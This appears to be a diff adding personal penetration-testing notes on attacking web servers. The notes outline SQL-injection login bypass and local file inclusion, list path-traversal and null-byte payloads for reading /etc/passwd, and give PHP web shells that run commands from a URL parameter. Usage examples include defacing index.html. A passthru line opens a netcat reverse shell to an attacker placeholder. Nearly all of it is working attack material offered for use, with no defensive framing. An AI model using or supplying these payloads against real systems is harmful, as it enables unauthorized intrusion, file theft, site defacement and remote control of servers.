@@ -1,3 +1,28 @@
+Search for port 80 or any port running web server
+
+If login page, bypass using sql injection, then hunt for LFI in pages
+
+http://vulnerable_host/preview.php?file=../../../../etc/passwd 
+
+==================== 
+Useful shells:
+
+<? system('uname -a');?>  
+<?php echo shell_exec($_GET['e'].' 2>&1'); ?>
+
+shell.php?e=whoami
+shell.php?e=pwd
+shell.php?e=uname%20-a (I had to URL encode the spaces otherwise my browser thought it should search using google)
+shell.php?e=echo%20This%20site%20has%20been%20hacked%3Eindex.html
+shell?e=ls%20-l%20/tmp
+
+Null Byte Techniques
+vuln.php?page=/etc/passwd 
+vuln.php?page=/etc/passwd%2500  
+http://vulnerable_host/preview.php?file=../../../../etc/passwd%00
+http://vulnerable_host/preview.php?file=../../../../etc/passwd%00jpg
+==========================
+
 in documents folder, a python file is created to look for important windows files.
 
 passthru("nc -e /bin/sh <attackerip> <attackerport>");
